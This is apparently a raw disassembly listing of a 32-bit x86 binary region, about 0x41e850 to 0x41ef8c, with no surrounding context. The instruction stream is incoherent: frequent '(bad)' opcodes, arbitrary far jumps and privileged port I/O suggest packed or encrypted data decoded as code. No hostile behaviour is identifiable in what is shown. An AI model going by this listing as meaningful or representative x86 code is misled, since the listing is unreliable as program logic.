  41e850:	ror    ch,cl
  41e852:	in     al,0x2c
  41e854:	jno    0x41e859
  41e856:	div    eax
  41e858:	xchg   ebp,eax
  41e859:	add    BYTE PTR [eax-0x309f300c],bh
  41e85f:	sub    eax,DWORD PTR [eax-0x7f]
  41e862:	gs jns 0x41e897
  41e865:	xchg   DWORD PTR [esi+eax*1],ebx
  41e868:	xchg   esi,eax
  41e869:	push   eax
  41e86a:	jnp    0x41e8e5
  41e86c:	sub    edi,DWORD PTR [ecx-0x80]
  41e86f:	xchg   esp,eax
  41e870:	ffree  st(1)
  41e872:	jmp    0x41e8ed
  41e874:	fs sti 
  41e876:	jne    0x41e83c
  41e878:	pop    es
  41e879:	push   es
  41e87a:	jmp    0x48be:0xe32d73f7
  41e881:	inc    edi
  41e882:	cmp    BYTE PTR [edi-0x5c4500ad],dh
  41e888:	cdq    
  41e889:	leave  
  41e88a:	aas    
  41e88b:	test   bh,bh
  41e88d:	pop    ebp
  41e88e:	mov    dl,0x67
  41e890:	jnp    0x41e8ba
  41e892:	push   ebp
  41e893:	mov    ds:0x1f1b4cb0,eax
  41e898:	leave  
  41e899:	lds    esp,FWORD PTR ds:0xfe7975dc
  41e89f:	stos   BYTE PTR es:[edi],al
  41e8a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8a1:	and    eax,esp
  41e8a3:	sub    eax,0x1f32e530
  41e8a8:	add    BYTE PTR [ebp-0x67d8e00e],dh
  41e8ae:	cmp    al,0x8d
  41e8b0:	mov    dl,0x7e
  41e8b2:	sub    BYTE PTR [eax+0x46ca9e32],ah
  41e8b8:	fdiv   st(2),st
  41e8ba:	mov    ds,WORD PTR [ecx-0x2c]
  41e8bd:	mov    bl,0x5d
  41e8bf:	sub    eax,0xf8548704
  41e8c4:	ror    BYTE PTR [ebp+0x49],0x55
  41e8c8:	es (bad) 
  41e8ca:	sub    DWORD PTR [ecx],ebx
  41e8cc:	sub    al,0x4
  41e8ce:	jo     0x41e948
  41e8d0:	std    
  41e8d1:	mov    al,ds:0x34064e7c
  41e8d6:	xor    esi,DWORD PTR [eax-0x76]
  41e8d9:	enter  0x79d4,0x18
  41e8dd:	dec    ebp
  41e8de:	push   edx
  41e8df:	xchg   edx,eax
  41e8e0:	adc    edi,DWORD PTR [edi+0x5345c68e]
  41e8e6:	and    eax,0x7dbceca3
  41e8eb:	cmc    
  41e8ec:	(bad)  
  41e8ed:	ror    bl,cl
  41e8ef:	sub    eax,0x39cea533
  41e8f4:	outs   dx,DWORD PTR ds:[esi]
  41e8f5:	adc    dl,bl
  41e8f7:	out    0x70,eax
  41e8f9:	(bad)  
  41e8fa:	daa    
  41e8fb:	adc    DWORD PTR [esi],0x3d
  41e8fe:	push   ebx
  41e8ff:	(bad)
  41e904:	mov    ebx,0xc52033c
  41e909:	out    dx,eax
  41e90a:	loop   0x41e978
  41e90c:	enter  0x4f25,0xd5
  41e910:	push   0x55baeca5
  41e915:	push   edx
  41e916:	mov    edi,0xf8d263c7
  41e91b:	jne    0x41e8f5
  41e91d:	and    edi,DWORD PTR [ecx-0x4a5beeea]
  41e923:	rol    BYTE PTR [eax+edx*8],0xc5
  41e927:	in     eax,dx
  41e928:	mov    BYTE PTR [edi],bl
  41e92a:	or     edi,DWORD PTR [ebp+0x1b]
  41e92d:	push   edx
  41e92e:	mov    edi,0x170474bd
  41e933:	out    0xaa,al
  41e935:	dec    DWORD PTR [ebx+0x384da772]
  41e93b:	mov    bh,0xf
  41e93d:	cmp    DWORD PTR [esi*8-0x1f61ce3e],0xcf87858f
  41e948:	push   es
  41e949:	sti    
  41e94a:	movntq QWORD PTR [ebx],mm0
  41e94d:	xor    sp,WORD PTR [edi+0x7121cbc8]
  41e954:	jne    0x41e979
  41e956:	mov    ch,0x84
  41e958:	jno    0x41e952
  41e95a:	xor    esi,DWORD PTR [ebx+0x67c8f95b]
  41e960:	out    dx,al
  41e961:	xchg   ebp,eax
  41e962:	xor    BYTE PTR [ebx-0x38],dh
  41e965:	adc    DWORD PTR [eax],ebx
  41e967:	in     al,0xba
  41e969:	push   ebp
  41e96a:	inc    ebp
  41e96b:	ffree  st(2)
  41e96d:	or     edx,0x7e67509e
  41e973:	jg     0x41e96c
  41e975:	psrad  mm2,QWORD PTR [esi-0x59]
  41e979:	lods   eax,DWORD PTR ds:[esi]
  41e97a:	das    
  41e97b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e97c:	push   0x1
  41e97e:	xor    dl,BYTE PTR [edi-0xa888a3f]
  41e984:	cs dec ebx
  41e986:	sub    ebx,DWORD PTR [eax+edi*8-0x57]
  41e98a:	ret    
  41e98b:	mov    ebp,0x801cae74
  41e990:	mov    esi,0xa893b274
  41e995:	sbb    BYTE PTR [edx-0x551f37a5],dh
  41e99b:	out    dx,eax
  41e99c:	outs   dx,DWORD PTR ds:[esi]
  41e99d:	stos   DWORD PTR es:[edi],eax
  41e99e:	lock mov dh,0xf9
  41e9a1:	dec    ebp
  41e9a2:	xor    BYTE PTR [ebp+0x15e4869b],ch
  41e9a8:	cmp    eax,0x2e51ed97
  41e9ad:	pop    es
  41e9ae:	retf   0xd2a6
  41e9b1:	test   BYTE PTR [ebx],dh
  41e9b3:	(bad)  
  41e9b4:	pop    ebx
  41e9b5:	sbb    al,0xad
  41e9b7:	out    0xf3,al
  41e9b9:	push   edi
  41e9ba:	cwde   
  41e9bb:	jbe    0x41e94e
  41e9bd:	fcmovb st,st(4)
  41e9bf:	push   ss
  41e9c0:	sahf   
  41e9c1:	pushf  
  41e9c2:	dec    edx
  41e9c3:	shl    DWORD PTR [edx],1
  41e9c5:	sbb    ah,BYTE PTR [eax]
  41e9c7:	pop    ebx
  41e9c8:	stos   DWORD PTR es:[edi],eax
  41e9c9:	cdq    
  41e9ca:	sysenter 
  41e9cc:	sub    ah,BYTE PTR [eax-0x2b]
  41e9cf:	pop    ebx
  41e9d0:	adc    bl,ch
  41e9d2:	stos   BYTE PTR es:[edi],al
  41e9d3:	inc    ebp
  41e9d4:	test   DWORD PTR [ebx],eax
  41e9d6:	jmp    0x41e9b1
  41e9d8:	std    
  41e9d9:	sahf   
  41e9da:	xchg   edi,eax
  41e9db:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41e9dd:	push   ebp
  41e9de:	in     al,0xb8
  41e9e0:	ffreep st(0)
  41e9e2:	mov    edi,0xcb2f5268
  41e9e7:	fsubp  st(0),st
  41e9e9:	jmp    0xfa0d82f0
  41e9ee:	test   eax,0x64375ebc
  41e9f3:	int3   
  41e9f4:	sub    BYTE PTR [ecx-0x6a4ca86e],al
  41e9fa:	jg     0x41e9aa
  41e9fc:	pop    eax
  41e9fd:	add    eax,0xabbcd1e5
  41ea02:	or     DWORD PTR [edi+ebx*1-0x5b],esi
  41ea06:	or     eax,0x9df69eb7
  41ea0b:	add    esi,ebp
  41ea0d:	pop    ebp
  41ea0e:	fwait
  41ea0f:	xchg   ebp,eax
  41ea10:	in     eax,dx
  41ea11:	or     eax,0x6f67dc2a
  41ea16:	out    dx,al
  41ea17:	(bad)  
  41ea19:	lods   al,BYTE PTR ds:[esi]
  41ea1a:	ins    DWORD PTR es:[edi],dx
  41ea1b:	arpl   dx,ax
  41ea1d:	jae    0x41ea18
  41ea1f:	jg     0x41ea73
  41ea21:	mov    ecx,0x77ef9f22
  41ea26:	test   eax,0x7fb3ab5f
  41ea2b:	fiadd  DWORD PTR [esi]
  41ea2d:	push   0x66
  41ea2f:	or     BYTE PTR [eiz*4-0xce45a68],dh
  41ea36:	scas   al,BYTE PTR es:[edi]
  41ea37:	fs inc ebp
  41ea39:	cdq    
  41ea3a:	in     al,0x79
  41ea3c:	pop    edi
  41ea3d:	sub    ah,dh
  41ea3f:	clc    
  41ea40:	jecxz  0x41e9cf
  41ea42:	pusha  
  41ea43:	mov    cl,0xa1
  41ea45:	ds loop 0x41ea0c
  41ea48:	clc    
  41ea49:	fild   DWORD PTR [ebx-0x4b]
  41ea4c:	sub    al,0x91
  41ea4e:	mov    eax,ds:0x29f0938b
  41ea53:	daa    
  41ea54:	sbb    eax,0x7d9fee6f
  41ea59:	pushf  
  41ea5a:	cmp    dh,BYTE PTR [eax-0x28]
  41ea5d:	pusha  
  41ea5e:	je     0x41e9fe
  41ea60:	shl    BYTE PTR [eax+0x3a01851f],cl
  41ea66:	dec    ecx
  41ea67:	jge    0x41ea9d
  41ea69:	mov    cs,ebx
  41ea6b:	mov    cl,BYTE PTR [esi]
  41ea6d:	scas   al,BYTE PTR es:[edi]
  41ea6e:	stos   DWORD PTR es:[edi],eax
  41ea6f:	inc    ebp
  41ea70:	adc    dh,al
  41ea72:	inc    ebx
  41ea73:	ret    
  41ea74:	in     eax,0x65
  41ea76:	mov    ecx,0x2e644ea8
  41ea7b:	sbb    dh,BYTE PTR [eax+esi*1]
  41ea7e:	push   esp
  41ea7f:	mov    ds:0x5db52bf0,al
  41ea84:	sub    ah,ah
  41ea86:	div    DWORD PTR [eax+0x79]
  41ea89:	mov    ss,WORD PTR [ebp-0x7b]
  41ea8c:	adc    ch,ah
  41ea8e:	shr    BYTE PTR [ebx-0x1a],cl
  41ea91:	mov    esp,0x7b37c11d
  41ea96:	jmp    edx
  41ea98:	mov    ah,0x17
  41ea9a:	inc    esp
  41ea9b:	std    
  41ea9c:	es push ss
  41ea9e:	dec    edx
  41ea9f:	arpl   WORD PTR [ebx+0x29],si
  41eaa2:	repz jo 0x41ea34
  41eaa5:	jns    0x41eaa9
  41eaa7:	out    dx,al
  41eaa8:	ja     0x41ea7a
  41eaaa:	scas   eax,DWORD PTR es:[edi]
  41eaab:	std    
  41eaac:	std    
  41eaad:	xchg   edx,eax
  41eaae:	pop    esp
  41eaaf:	adc    BYTE PTR [edx],0xf
  41eab2:	pop    ebx
  41eab3:	mov    ds:0x68415425,al
  41eab8:	repz or al,0x6f
  41eabb:	(bad)
  41eabe:	call   0x77f1aad7
  41eac3:	xor    edi,DWORD PTR [ebp-0x30]
  41eac6:	jle    0x41eb3c
  41eac8:	ins    DWORD PTR es:[edi],dx
  41eac9:	jge    0x41ead0
  41eacb:	(bad)  
  41eacc:	xor    al,0x34
  41eace:	xor    al,0x85
  41ead0:	repnz cdq 
  41ead2:	aas    
  41ead3:	repnz in eax,0x90
  41ead6:	or     eax,0x9d8033c5
  41eadb:	out    0xdb,eax
  41eadd:	sub    bh,bl
  41eadf:	test   cx,sp
  41eae2:	adc    bl,BYTE PTR [edx]
  41eae4:	push   ecx
  41eae5:	popf   
  41eae6:	test   eax,0xf2c44ff
  41eaeb:	frstor [ebx+ebx*2+0x6c]
  41eaef:	mov    edi,0x979dde6f
  41eaf4:	(bad)  
  41eaf5:	shl    BYTE PTR es:[edx+0x7c171971],1
  41eafc:	outs   dx,DWORD PTR ds:[esi]
  41eafd:	mov    dh,0xd6
  41eaff:	jb     0x41ea8f
  41eb01:	or     al,0xda
  41eb03:	mov    ebp,0xbe489c02
  41eb08:	push   edi
  41eb09:	ret    0x5f74
  41eb0c:	scas   eax,DWORD PTR es:[edi]
  41eb0d:	jmp    0xc1de2a2e
  41eb12:	xor    esp,esi
  41eb14:	lea    esi,[edi]
  41eb16:	mov    BYTE PTR [esi],ch
  41eb18:	mov    cl,0x6e
  41eb1a:	or     dh,al
  41eb1c:	mov    cl,0x2b
  41eb1e:	cs pop eax
  41eb20:	add    eax,DWORD PTR [edx-0x7df5b6b7]
  41eb26:	and    dh,ch
  41eb28:	lods   eax,DWORD PTR ds:[esi]
  41eb29:	xor    ecx,esp
  41eb2b:	fwait
  41eb2c:	jmp    0x41eb76
  41eb2e:	mov    ds:0x658cca3c,eax
  41eb33:	mov    ecx,DWORD PTR [ebx-0x1a0ac2f]
  41eb39:	mov    DWORD PTR [edi-0x65],edx
  41eb3c:	add    BYTE PTR [ecx-0x377b3474],cl
  41eb42:	into   
  41eb43:	dec    eax
  41eb44:	push   edx
  41eb45:	and    ecx,edi
  41eb47:	mov    esi,DWORD PTR ds:0x344a4bb6
  41eb4d:	ret    0x5505
  41eb50:	cdq    
  41eb51:	mov    esp,0x9bedfb07
  41eb56:	(bad)  
  41eb57:	stos   BYTE PTR es:[edi],al
  41eb58:	jo     0x41ebc8
  41eb5a:	push   cs
  41eb5b:	pop    ebx
  41eb5c:	nop
  41eb5d:	inc    ebp
  41eb5e:	push   ds
  41eb5f:	cld    
  41eb60:	mov    ecx,0xd60eb157
  41eb65:	test   al,0x59
  41eb68:	sahf   
  41eb69:	shl    eax,0x43
  41eb6c:	shr    bh,0x3d
  41eb6f:	loop   0x41eafc
  41eb71:	xchg   DWORD PTR [ecx-0x62],edx
  41eb74:	jae    0x41eb3c
  41eb76:	mov    esp,0x53f5eb3d
  41eb7b:	sbb    DWORD PTR [ecx],esp
  41eb7d:	in     al,0x6b
  41eb7f:	sahf   
  41eb80:	out    dx,al
  41eb81:	hlt    
  41eb82:	sbb    cl,dl
  41eb84:	pop    edx
  41eb86:	and    BYTE PTR [esi-0x3dcdeaf3],bh
  41eb8c:	icebp  
  41eb8d:	pusha  
  41eb8e:	xchg   ebp,eax
  41eb8f:	hlt    
  41eb90:	cmp    al,BYTE PTR [ebp-0x2b285bd4]
  41eb96:	xchg   DWORD PTR [esi+0x63],ebx
  41eb99:	mov    bh,0xc
  41eb9b:	xchg   ecx,eax
  41eb9c:	jbe    0x41ebbd
  41eb9e:	lea    edi,[edx]
  41eba0:	pop    ds
  41eba1:	test   ah,ch
  41eba3:	and    cl,ch
  41eba5:	nop
  41eba6:	and    al,0xde
  41eba8:	pop    esi
  41eba9:	mov    edx,ebp
  41ebab:	cmc    
  41ebac:	cmp    DWORD PTR [ecx],ecx
  41ebae:	test   al,0xb1
  41ebb0:	fisub  DWORD PTR [ebp+0x28]
  41ebb3:	scas   al,BYTE PTR es:[edi]
  41ebb4:	loop   0x41ec20
  41ebb6:	sub    al,0x3b
  41ebb8:	cli    
  41ebb9:	dec    ebp
  41ebba:	ss jnp 0x41ebec
  41ebbd:	or     DWORD PTR [ecx],ecx
  41ebbf:	fimul  DWORD PTR [esi]
  41ebc1:	std    
  41ebc2:	repz inc esp
  41ebc4:	inc    edx
  41ebc5:	xor    al,0x4a
  41ebc7:	fimul  WORD PTR [edx-0x39]
  41ebca:	out    0x7e,eax
  41ebcc:	enter  0x2ada,0x37
  41ebd0:	mov    eax,0xcbcf8abb
  41ebd5:	test   bh,0xa2
  41ebd8:	mov    ah,0xc
  41ebda:	das    
  41ebdb:	out    dx,al
  41ebdc:	inc    esi
  41ebdd:	fbstp  TBYTE PTR [ebp+0x10]
  41ebe0:	add    bh,BYTE PTR [edi]
  41ebe2:	mov    WORD PTR [edx],ds
  41ebe4:	or     BYTE PTR [edx-0x40],dl
  41ebe7:	inc    ebp
  41ebe8:	loopne 0x41eb74
  41ebea:	xchg   ebp,eax
  41ebeb:	pop    esp
  41ebec:	(bad)
  41ebef:	outs   dx,DWORD PTR ds:[esi]
  41ebf0:	sbb    al,0x35
  41ebf2:	mov    edi,0xc951edd6
  41ebf7:	dec    edx
  41ebf8:	and    esi,ebx
  41ebfa:	mov    edx,0x8ae3b1b0
  41ebff:	loop   0x41ebf6
  41ec01:	add    al,BYTE PTR [esi]
  41ec03:	repnz std 
  41ec05:	clc    
  41ec06:	rcl    ecx,cl
  41ec08:	gs call 0x72cd56f9
  41ec0e:	(bad)  [ebx-0x5b]
  41ec11:	adc    DWORD PTR [ebx+0xd],ebp
  41ec14:	mov    ah,0xb9
  41ec16:	retf   0x7752
  41ec19:	mov    cl,0x15
  41ec1b:	test   ecx,edx
  41ec1d:	sti    
  41ec1e:	xchg   esi,eax
  41ec1f:	cmp    DWORD PTR [edx+0x40],esi
  41ec22:	jmp    0xa60f:0x1fef33ac
  41ec29:	jb     0x41ebd3
  41ec2b:	push   ecx
  41ec2c:	and    DWORD PTR [edx-0x3a3e15ad],ebp
  41ec32:	mov    dl,ch
  41ec34:	jmp    0x5fef:0xfb77f4e4
  41ec3b:	push   ecx
  41ec3c:	sbb    eax,0x1b0fe9e2
  41ec41:	xchg   BYTE PTR [ebx],al
  41ec43:	mov    dl,0xa9
  41ec45:	dec    ecx
  41ec46:	fdivr  st(6),st
  41ec48:	cld    
  41ec49:	xchg   ebp,eax
  41ec4a:	stos   DWORD PTR es:[edi],eax
  41ec4b:	in     eax,dx
  41ec4c:	pop    es
  41ec4d:	and    al,BYTE PTR [ebx-0x16eb21f]
  41ec53:	aad    0x29
  41ec55:	sbb    al,0xb1
  41ec57:	jl     0x41ebfb
  41ec59:	and    al,0x20
  41ec5b:	js     0x41ecdc
  41ec5d:	cli    
  41ec5e:	pop    ebx
  41ec5f:	in     al,0xd1
  41ec61:	jae    0x41ec18
  41ec63:	dec    esp
  41ec64:	mov    al,0x28
  41ec66:	xchg   edi,eax
  41ec67:	pop    esi
  41ec68:	inc    esi
  41ec69:	or     al,0x79
  41ec6b:	stc    
  41ec6c:	xchg   edx,eax
  41ec6d:	push   0xffffffec
  41ec6f:	mov    esp,es
  41ec71:	push   cs
  41ec72:	pop    esp
  41ec73:	cmc    
  41ec74:	mov    eax,0xe9565045
  41ec79:	jae    0x41ec90
  41ec7b:	iret   
  41ec7c:	add    al,0x23
  41ec7e:	xor    ebx,DWORD PTR [eax]
  41ec80:	test   DWORD PTR [ebx-0x3d34179f],0xb70a83b0
  41ec8a:	(bad)  
  41ec8c:	xlat   BYTE PTR ds:[ebx]
  41ec8d:	push   edx
  41ec8e:	stos   BYTE PTR es:[edi],al
  41ec8f:	push   esi
  41ec90:	shl    DWORD PTR [edi-0x3b790224],1
  41ec96:	xchg   esp,eax
  41ec97:	or     bl,bl
  41ec99:	xchg   edx,eax
  41ec9a:	loope  0x41ec33
  41ec9c:	test   al,0xd2
  41ec9e:	jl     0x41ec99
  41eca0:	xchg   edx,eax
  41eca1:	mov    esp,ss
  41eca3:	pop    es
  41eca4:	pop    eax
  41eca5:	jp     0x41ed07
  41eca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eca8:	das    
  41eca9:	and    al,0xc7
  41ecab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecac:	fist   WORD PTR [edx-0x7a]
  41ecaf:	xor    ebp,eax
  41ecb1:	and    al,0xd3
  41ecb3:	stc    
  41ecb4:	add    BYTE PTR [edi],bh
  41ecb6:	or     bh,bh
  41ecb8:	push   ebp
  41ecb9:	mov    al,ds:0xe7a69b63
  41ecbe:	adc    al,0x43
  41ecc0:	or     ecx,DWORD PTR [edi+0x35]
  41ecc3:	stc    
  41ecc4:	pop    eax
  41ecc5:	aad    0x8c
  41ecc7:	xor    eax,DWORD PTR [edx]
  41ecc9:	nop
  41ecca:	fnsetpm(287 only) 
  41eccc:	jl     0x41ec75
  41ecce:	push   cs
  41eccf:	(bad)  
  41ecd0:	mov    ?,WORD PTR [eax]
  41ecd2:	imul   edi,edx,0x2131e028
  41ecd8:	fucom  st(4)
  41ecda:	jecxz  0x41ed39
  41ecdc:	ss call 0x37e74546
  41ece2:	dec    ecx
  41ece3:	fdiv   st(2),st
  41ece5:	mov    cl,0x63
  41ece7:	fdiv   st,st(4)
  41ece9:	out    dx,al
  41ecea:	xchg   ch,ch
  41ecec:	push   0x815f2a1b
  41ecf1:	outs   dx,BYTE PTR ds:[esi]
  41ecf2:	cs fwait
  41ecf4:	xor    esp,ebx
  41ecf6:	in     eax,dx
  41ecf7:	or     al,BYTE PTR [esi]
  41ecf9:	add    esi,DWORD PTR [eax]
  41ecfb:	out    0x22,eax
  41ecfd:	sbb    al,BYTE PTR ds:0x6a48285
  41ed03:	mov    ?,ecx
  41ed05:	inc    esp
  41ed06:	mov    ecx,DWORD PTR [esi+0x6e]
  41ed09:	test   BYTE PTR [eax-0x54],bh
  41ed0c:	pslld  mm3,QWORD PTR ds:0x91d46bdd
  41ed13:	call   0xf104566c
  41ed18:	repnz xchg edi,eax
  41ed1a:	ins    DWORD PTR es:[edi],dx
  41ed1b:	push   esp
  41ed1c:	cmp    edx,DWORD PTR [edi+0x1812ee8a]
  41ed22:	xchg   ecx,eax
  41ed23:	mov    eax,ds:0xf0c36a72
  41ed28:	(bad)  
  41ed29:	data16 adc BYTE PTR fs:[eax+0x28b0bb0],cl
  41ed31:	icebp  
  41ed32:	dec    eax
  41ed33:	mov    ah,0x33
  41ed35:	(bad)  
  41ed36:	(bad)  
  41ed37:	mov    ebx,0xd89caf3e
  41ed3c:	sbb    eax,0x4dad87a8
  41ed41:	xor    BYTE PTR [ebp-0x65],0x25
  41ed45:	add    ebx,0xcbd13f2
  41ed4b:	out    0x47,eax
  41ed4d:	mov    esp,0xa28e6342
  41ed52:	in     al,dx
  41ed53:	push   ecx
  41ed54:	inc    ebp
  41ed55:	pop    ss
  41ed56:	std    
  41ed57:	lods   al,BYTE PTR ds:[esi]
  41ed58:	push   es
  41ed59:	ja     0x41ed77
  41ed5b:	mov    ecx,0x1036f3bd
  41ed60:	ins    DWORD PTR es:[edi],dx
  41ed61:	cdq    
  41ed62:	jae    0x41edbc
  41ed64:	test   al,0x34
  41ed66:	push   cs
  41ed67:	call   0xe66bce72
  41ed6c:	iret   
  41ed6d:	push   edi
  41ed6e:	inc    ecx
  41ed6f:	pusha  
  41ed70:	dec    ebx
  41ed71:	add    DWORD PTR ds:0x9536435e,ebx
  41ed77:	enter  0xdb3b,0xe3
  41ed7b:	cli    
  41ed7c:	or     ecx,ebx
  41ed7e:	jmp    0x9cc7f99c
  41ed83:	test   DWORD PTR ds:[ebp*1-0x1831e6b9],0xca240114
  41ed8f:	pop    ecx
  41ed90:	fisubr WORD PTR [eax-0x5f]
  41ed93:	mov    ds:0x450f9299,al
  41ed98:	aam    0xbb
  41ed9a:	call   0x8c36:0xec110f02
  41eda1:	cmp    BYTE PTR [ebx],0x19
  41eda4:	or     al,0x30
  41eda6:	jle    0x41eda7
  41eda8:	pop    esi
  41eda9:	mov    eax,ecx
  41edab:	loop   0x41edb6
  41edad:	add    al,0xe1
  41edaf:	fcomi  st,st(4)
  41edb1:	cmp    DWORD PTR [eax-0x12],esp
  41edb4:	fistp  DWORD PTR [eax+0x72c1b243]
  41edba:	push   esi
  41edbb:	aas    
  41edbc:	sbb    BYTE PTR [ecx],dh
  41edbe:	inc    edx
  41edbf:	push   es
  41edc0:	fmul   QWORD PTR [esi]
  41edc2:	jae    0x41edea
  41edc4:	ficomp DWORD PTR [ebx+ebx*1]
  41edc7:	mov    ds:0x78457dba,eax
  41edcc:	jnp    0x41eddf
  41edce:	out    0x46,eax
  41edd0:	ret    0x8c70
  41edd3:	test   al,0x8a
  41edd5:	outs   dx,BYTE PTR ds:[esi]
  41edd6:	push   ebx
  41edd7:	pop    ebx
  41edd8:	jmp    0x9d3d:0x47fbd1af
  41eddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ede0:	fucomi st,st(6)
  41ede2:	pop    ebp
  41ede3:	cwde   
  41ede4:	stos   BYTE PTR es:[edi],al
  41ede5:	popa   
  41ede6:	jns    0x41edc1
  41ede8:	stos   DWORD PTR es:[edi],eax
  41ede9:	out    0x39,eax
  41edeb:	fwait
  41edec:	xor    bh,BYTE PTR [edx]
  41edee:	jbe    0x41ee4b
  41edf0:	ds pop ds
  41edf2:	mov    ds:0x55111813,eax
  41edf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edf8:	inc    esi
  41edf9:	jae    0x41ee63
  41edfb:	repnz outs dx,DWORD PTR ds:[esi]
  41edfd:	jns    0x41edd2
  41edff:	cmp    DWORD PTR [esi],esp
  41ee01:	sbb    esp,0xc49af4eb
  41ee07:	cmp    edi,0x33af2807
  41ee0d:	xor    DWORD PTR [ebx+0x9],ecx
  41ee10:	les    ebx,FWORD PTR [eax+0x7c]
  41ee13:	fwait
  41ee14:	loopne 0x41ee93
  41ee16:	mov    esp,0x3bad1261
  41ee1b:	ins    BYTE PTR es:[edi],dx
  41ee1c:	fadd   QWORD PTR ds:0xd2acb312
  41ee22:	dec    ecx
  41ee23:	in     eax,0x45
  41ee25:	nop
  41ee26:	(bad)  
  41ee27:	not    BYTE PTR [edx]
  41ee29:	cwd    
  41ee2b:	in     al,0x4a
  41ee2d:	daa    
  41ee2e:	shr    BYTE PTR [edi+0x3d],1
  41ee31:	aad    0x27
  41ee33:	inc    edx
  41ee34:	mov    ecx,0xa3d8315
  41ee39:	scas   al,BYTE PTR es:[edi]
  41ee3a:	push   ss
  41ee3b:	rcr    BYTE PTR [eax-0x516a235a],0x62
  41ee42:	sub    DWORD PTR [ebp-0x33],eax
  41ee45:	pop    edx
  41ee46:	dec    esp
  41ee47:	sbb    al,0x3c
  41ee49:	add    al,0x6a
  41ee4b:	add    DWORD PTR [edx],ebp
  41ee4d:	xor    BYTE PTR [ecx+0x21828934],al
  41ee53:	add    eax,0x3ad8a839
  41ee58:	repz add DWORD PTR [esi],esi
  41ee5b:	mov    dl,0x26
  41ee5d:	pop    edi
  41ee5e:	retf   0xa1aa
  41ee61:	cdq    
  41ee62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee63:	sub    ch,BYTE PTR [ebx-0x1eddcde6]
  41ee69:	or     eax,0x6525fa7e
  41ee6e:	lds    eax,FWORD PTR ss:[edx]
  41ee71:	test   eax,0x3d0712b
  41ee76:	mov    ecx,0xab8cd28c
  41ee7b:	mov    ah,0x28
  41ee7d:	xchg   edi,eax
  41ee7e:	sbb    BYTE PTR [ebx+0x50e646b0],cl
  41ee84:	mov    bh,0x81
  41ee86:	mov    al,0xb2
  41ee88:	neg    BYTE PTR [esi+0x4cddd88f]
  41ee8e:	mov    ah,0x60
  41ee90:	jmp    0x61ccb573
  41ee95:	or     edx,DWORD PTR [eax-0x768ec4fb]
  41ee9b:	push   ecx
  41ee9c:	sub    eax,0xbeed366d
  41eea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eea2:	sub    BYTE PTR [ebx-0x730f8d3],ah
  41eea8:	adc    dh,BYTE PTR [edi+0x3c8fd906]
  41eeae:	add    al,0x48
  41eeb0:	jne    0x41eeb7
  41eeb2:	shl    bh,0x74
  41eeb5:	mov    cl,dh
  41eeb7:	out    0x8,eax
  41eeb9:	fadd   QWORD PTR ds:0x86201585
  41eebf:	nop
  41eec0:	xchg   edx,eax
  41eec1:	shl    DWORD PTR [ebx-0x5a],cl
  41eec4:	daa    
  41eec5:	push   ecx
  41eec6:	aam    0xe1
  41eec8:	push   ecx
  41eec9:	push   esi
  41eeca:	sar    cl,cl
  41eecc:	add    eax,0x15ec3a0c
  41eed1:	hlt    
  41eed2:	jmp    0x41ef12
  41eed4:	sub    ah,dl
  41eed6:	popf   
  41eed7:	aad    0xa2
  41eed9:	sbb    DWORD PTR [ebx+0x467bf5d1],esp
  41eedf:	outs   dx,BYTE PTR ds:[esi]
  41eee0:	sub    eax,0x300d79c7
  41eee5:	pop    edi
  41eee6:	xor    DWORD PTR [edx-0x60],esp
  41eee9:	inc    edx
  41eeea:	(bad)  
  41eeeb:	jns    0x41ef23
  41eeed:	ja     0x41ef32
  41eeef:	out    dx,al
  41eef0:	aas    
  41eef1:	rcl    bh,1
  41eef3:	dec    esi
  41eef4:	ins    BYTE PTR es:[edi],dx
  41eef5:	push   ebx
  41eef6:	fisttp QWORD PTR [edx+0x7ef3a370]
  41eefc:	mov    eax,ds:0x8f9f7bc1
  41ef01:	dec    ebp
  41ef02:	pop    DWORD PTR [eax]
  41ef04:	dec    ebx
  41ef05:	mov    ebx,0x7377d115
  41ef0a:	mov    ds:0xf6eba2a9,eax
  41ef0f:	mov    edx,ebx
  41ef11:	sub    ecx,DWORD PTR [ebx+0x4046a29d]
  41ef17:	inc    esi
  41ef18:	lods   eax,DWORD PTR ds:[esi]
  41ef19:	sub    cl,BYTE PTR [eax+eax*4]
  41ef1c:	dec    ebp
  41ef1d:	pop    ds
  41ef1e:	lea    ebp,[ebx]
  41ef20:	les    ecx,FWORD PTR [eax-0x64]
  41ef23:	adc    eax,0x550b4c09
  41ef28:	fwait
  41ef29:	int    0x33
  41ef2b:	hlt    
  41ef2c:	data16 jns 0x41ef00
  41ef2f:	push   ebp
  41ef30:	fidiv  WORD PTR [edi]
  41ef32:	es es enter 0x76,0xc3
  41ef38:	mov    dh,dl
  41ef3a:	pop    edx
  41ef3b:	xchg   edi,eax
  41ef3c:	sub    ah,BYTE PTR [ebp-0x68]
  41ef3f:	and    DWORD PTR [esi-0x598a1607],esp
  41ef45:	inc    edi
  41ef46:	iret   
  41ef47:	xchg   ebp,eax
  41ef48:	cmp    ebp,edi
  41ef4a:	adc    edx,DWORD PTR [eax-0xe5554a1]
  41ef50:	xchg   esi,eax
  41ef51:	jnp    0x41ef91
  41ef53:	dec    edi
  41ef54:	jno    0x41ef9b
  41ef56:	outs   dx,BYTE PTR ds:[esi]
  41ef57:	test   eax,0x950a0874
  41ef5c:	stc    
  41ef5d:	in     al,dx
  41ef5e:	fwait
  41ef5f:	(bad)  
  41ef60:	pop    ebp
  41ef61:	adc    DWORD PTR [eax+0x47e24bdd],esi
  41ef67:	shr    BYTE PTR [esi+0x32c59fd3],cl
  41ef6d:	ja     0x41efa8
  41ef6f:	retf   
  41ef70:	and    al,0xe9
  41ef72:	mov    esi,0x7d279e91
  41ef77:	xchg   ebx,eax
  41ef78:	xchg   edi,eax
  41ef79:	sbb    al,0x25
  41ef7b:	sbb    al,0xa6
  41ef7d:	push   edx
  41ef7e:	cwde   
  41ef7f:	fcomp  QWORD PTR [edi+eax*4+0x5f]
  41ef83:	adc    BYTE PTR ds:0xae47f99a,bl
  41ef89:	std    
  41ef8a:	jbe    0x41f008
  41ef8c:	aaa    
